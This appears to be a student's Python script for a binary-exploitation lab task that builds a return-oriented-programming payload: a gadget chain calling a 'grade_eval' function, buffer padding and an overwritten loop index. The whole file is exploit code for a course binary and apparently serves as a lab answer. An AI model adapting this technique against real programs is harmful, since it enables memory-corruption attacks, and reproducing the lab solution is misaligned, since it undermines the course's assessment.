#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

p64 = lambda x: struct.pack("<Q", x)

# ROP chain: 128 bytes
rop = (
    p64(0x4018a3)   # pop rdi; ret
    + p64(4)
    + p64(0x401677) # grade_eval
    + p64(0x401835) # main's ret instruction
)

rop = rop.ljust(128, b"A")

# Fill the remaining input buffer.
padding = b"B" * (256 - 128)

# Set i = 0xc8.
index = struct.pack("<I", 0xc8)

payload = rop + padding + index

sys.stdout.buffer.write(payload)

